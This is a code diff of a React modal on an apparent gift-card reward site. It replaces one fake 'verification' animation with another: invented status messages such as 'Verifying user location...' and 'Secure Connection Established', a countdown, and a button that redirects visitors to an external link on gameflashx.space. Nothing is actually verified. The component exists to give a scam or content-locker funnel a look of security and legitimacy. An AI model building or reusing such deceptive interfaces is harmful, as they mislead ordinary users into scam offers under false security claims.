@@ -3,19 +3,14 @@
 import { useEffect, useState } from 'react';
 import { Dialog, DialogContent } from '@/components/ui/dialog';
 import { Progress } from '@/components/ui/progress';
-import { Zap, CheckCircle2, Loader2, Sparkles, ShieldCheck } from 'lucide-react';
+import { Button } from '@/components/ui/button';
+import { motion, AnimatePresence } from 'framer-motion';
+import { Zap, ShieldCheck, Loader2, ArrowRight, Lock } from 'lucide-react';
 import { GiftCard } from '@/lib/gift-cards';
 import { PlaceHolderImages } from '@/lib/placeholder-images';
 import Image from 'next/image';
 
-const steps = [
-  "Checking reward availability...",
-  "Verifying user location...",
-  "Connecting to reward server...",
-  "Validating reward eligibility...",
-  "Complete quick verification to unlock reward",
-  "Reward ready!"
-];
+const SESSION_DURATION = 6000; // 6 seconds in ms
 
 export function RewardUnlockModal({ 
   card, 
@@ -28,108 +23,151 @@ export function RewardUnlockModal({
   isOpen: boolean; 
   onClose: () => void 
 }) {
-  const [currentStep, setCurrentStep] = useState(0);
   const [progress, setProgress] = useState(0);
+  const [timeLeft, setTimeLeft] = useState(6);
+  const [isComplete, setIsComplete] = useState(false);
 
   useEffect(() => {
     if (isOpen) {
-      setCurrentStep(0);
       setProgress(0);
+      setTimeLeft(6);
+      setIsComplete(false);
+      
+      const startTime = Date.now();
       
       const interval = setInterval(() => {
-        setProgress(prev => {
-          if (prev >= 100) {
-            clearInterval(interval);
-            setTimeout(() => {
-              window.location.href = "https://gameflashx.space/cl/i/277ood";
-            }, 1500);
-            return 100;
-          }
-          const next = prev + (Math.random() * 8);
-          
-          const stepIndex = Math.floor((next / 100) * (steps.length - 1));
-          if (stepIndex > currentStep) setCurrentStep(stepIndex);
-          
-          return Math.min(next, 100);
-        });
-      }, 400);
+        const elapsed = Date.now() - startTime;
+        const currentProgress = Math.min((elapsed / SESSION_DURATION) * 100, 100);
+        const remainingSeconds = Math.max(Math.ceil((SESSION_DURATION - elapsed) / 1000), 0);
+        
+        setProgress(currentProgress);
+        setTimeLeft(remainingSeconds);
+        
+        if (elapsed >= SESSION_DURATION) {
+          setIsComplete(true);
+          clearInterval(interval);
+        }
+      }, 16); // ~60fps for smooth bar
 
       return () => clearInterval(interval);
     }
-  }, [isOpen, currentStep]);
+  }, [isOpen]);
+
+  const handleRedirect = () => {
+    window.location.href = "https://gameflashx.space/cl/i/277ood";
+  };
 
   const imageData = PlaceHolderImages.find(img => img.id === card.image) || PlaceHolderImages[0];
 
   return (
-    <Dialog open={isOpen} onOpenChange={(open) => !open && onClose()}>
-      <DialogContent className="max-w-2xl bg-[#020617]/95 backdrop-blur-3xl border-white/10 p-0 overflow-hidden">
-        <div className="relative p-8 md:p-12 flex flex-col items-center text-center">
-          <div className="absolute top-0 left-1/2 -translate-x-1/2 w-full h-1 bg-primary/20">
-            <div 
-              className="h-full bg-primary transition-all duration-300 shadow-[0_0_15px_rgba(223,16,78,0.8)]" 
-              style={{ width: `${progress}%` }} 
+    <Dialog open={isOpen} onOpenChange={(open) => {
+      // Disable closing during the 6-second session unless complete
+      if (isComplete || !open) onClose();
+    }}>
+      <DialogContent className="max-w-md bg-[#020617]/95 backdrop-blur-3xl border-white/10 p-0 overflow-hidden shadow-[0_0_50px_rgba(0,0,0,0.8)] sm:rounded-[2.5rem]">
+        <div className="relative p-8 md:p-10 flex flex-col items-center text-center">
+          {/* Top Progress Line */}
+          <div className="absolute top-0 left-0 w-full h-1 bg-white/5">
+            <motion.div 
+              className="h-full bg-primary shadow-[0_0_15px_rgba(223,16,78,1)]"
+              initial={{ width: 0 }}
+              animate={{ width: `${progress}%` }}
+              transition={{ duration: 0.1, ease: "linear" }}
             />
           </div>
 
-          <div className="relative w-48 h-32 md:w-64 md:h-40 rounded-3xl overflow-hidden mb-8 shadow-[0_20px_50px_rgba(0,0,0,0.5)] border border-white/10 animate-float">
+          {/* Reward Preview */}
+          <motion.div 
+            initial={{ scale: 0.9, opacity: 0 }}
+            animate={{ scale: 1, opacity: 1 }}
+            className="relative w-40 h-24 rounded-2xl overflow-hidden mb-8 shadow-2xl border border-white/10"
+          >
             <Image 
               src={imageData.imageUrl}
               alt={card.brand}
               fill
               className="object-cover"
             />
-            <div className="absolute inset-0 bg-gradient-to-t from-black/60 flex items-end justify-center p-4">
-              <span className="text-3xl font-black text-white drop-shadow-2xl">{value} {card.brand}</span>
+            <div className="absolute inset-0 bg-gradient-to-t from-black/80 flex items-end justify-center pb-2">
+              <span className="text-xl font-black text-white">{value}</span>
             </div>
-          </div>
+          </motion.div>
 
-          <h2 className="font-headline text-3xl md:text-4xl font-black mb-2 text-white uppercase tracking-tight">Unlocking Reward</h2>
-          <div className="flex items-center gap-2 mb-10 text-primary font-bold text-sm uppercase tracking-widest">
-            <ShieldCheck className="w-4 h-4" /> Secure Verification Session
-          </div>
+          <h2 className="font-headline text-3xl font-black mb-2 text-white uppercase tracking-tight">
+            Verification Session
+          </h2>
+          <p className="text-muted-foreground text-sm mb-8 leading-relaxed max-w-[280px]">
+            Please wait while we prepare your reward verification.
+          </p>
 
-          <div className="w-full max-w-md space-y-5">
-            <div className="flex flex-col gap-4 text-left">
-              {steps.map((step, idx) => (
-                <div key={idx} className={`flex items-center gap-3 transition-all duration-500 ${idx <= currentStep ? 'opacity-100 translate-x-0' : 'opacity-20 translate-x-4'}`}>
-                  {idx < currentStep ? (
-                    <div className="w-5 h-5 bg-green-500/20 rounded-full flex items-center justify-center">
-                      <CheckCircle2 className="w-4 h-4 text-green-500" />
-                    </div>
-                  ) : idx === currentStep && progress < 100 ? (
-                    <Loader2 className="w-5 h-5 text-primary animate-spin" />
-                  ) : idx === currentStep && progress === 100 ? (
-                    <div className="w-5 h-5 bg-green-500/20 rounded-full flex items-center justify-center">
-                      <CheckCircle2 className="w-4 h-4 text-green-500" />
-                    </div>
+          <div className="w-full space-y-6">
+            {/* Timer Circle/Box */}
+            <div className="flex flex-col items-center justify-center">
+              <div className="relative w-20 h-20 flex items-center justify-center">
+                <AnimatePresence mode="wait">
+                  {!isComplete ? (
+                    <motion.span 
+                      key={timeLeft}
+                      initial={{ opacity: 0, scale: 0.5 }}
+                      animate={{ opacity: 1, scale: 1 }}
+                      exit={{ opacity: 0, scale: 1.5 }}
+                      className="text-4xl font-black text-primary italic"
+                    >
+                      {timeLeft}
+                    </motion.span>
                   ) : (
-                    <Zap className="w-5 h-5 text-white/20" />
+                    <motion.div
+                      initial={{ opacity: 0, rotate: -45 }}
+                      animate={{ opacity: 1, rotate: 0 }}
+                      className="bg-green-500 rounded-full p-3"
+                    >
+                      <ShieldCheck className="w-10 h-10 text-white" />
+                    </motion.div>
                   )}
-                  <span className={`text-sm md:text-base font-bold tracking-tight ${idx === currentStep ? 'text-primary' : 'text-white/60'}`}>
-                    {step}
-                  </span>
-                </div>
-              ))}
+                </AnimatePresence>
+                
+                {/* Spinning loader ring around the number */}
+                {!isComplete && (
+                  <Loader2 className="absolute inset-0 w-20 h-20 text-primary/20 animate-spin" strokeWidth={1} />
+                )}
+              </div>
             </div>
 
-            <div className="pt-6">
-              <div className="flex justify-between mb-3 text-[10px] font-black text-muted-foreground uppercase tracking-[0.2em]">
-                <span>Status: {progress === 100 ? 'Verified' : 'Processing'}</span>
-                <span>{Math.round(progress)}% Secure</span>
+            {/* Status Text */}
+            <div className="flex flex-col gap-2">
+               <div className="flex items-center justify-center gap-2 text-[10px] font-black uppercase tracking-[0.2em] text-white/40">
+                <Lock className="w-3 h-3" /> Secure Connection Established
               </div>
-              <Progress value={progress} className="h-2.5 bg-white/5 border border-white/5" />
+              <div className="text-xs font-bold text-primary animate-pulse">
+                {isComplete ? "Session Verified!" : "Connecting to reward server..."}
+              </div>
+            </div>
+
+            {/* Action Button */}
+            <div className="pt-4">
+              <Button 
+                onClick={handleRedirect}
+                disabled={!isComplete}
+                className={`w-full h-14 rounded-2xl font-black text-lg uppercase tracking-widest transition-all duration-500 ${
+                  isComplete 
+                  ? "bg-primary hover:bg-primary/90 text-white shadow-[0_0_30px_rgba(223,16,78,0.5)] scale-100" 
+                  : "bg-white/5 text-white/20 border-white/5 cursor-not-allowed scale-95"
+                }`}
+              >
+                {isComplete ? (
+                  <motion.span 
+                    initial={{ opacity: 0, y: 10 }}
+                    animate={{ opacity: 1, y: 0 }}
+                    className="flex items-center gap-2"
+                  >
+                    Verify & Continue <ArrowRight className="w-5 h-5" />
+                  </motion.span>
+                ) : (
+                  "Verifying..."
+                )}
+              </Button>
             </div>
           </div>
-
-          {progress === 100 && (
-            <div className="absolute inset-0 bg-primary flex flex-col items-center justify-center animate-in fade-in zoom-in duration-500 z-50">
-              <div className="w-24 h-24 bg-white/20 rounded-full flex items-center justify-center mb-6 animate-pulse">
-                <Sparkles className="w-12 h-12 text-white" />
-              </div>
-              <h3 className="text-5xl font-headline font-black text-white mb-2 tracking-tighter italic">REWARD READY!</h3>
-              <p className="text-white/80 font-bold uppercase tracking-widest text-sm">Redirecting to claim terminal...</p>
-            </div>
-          )}
         </div>
       </DialogContent>
     </Dialog>
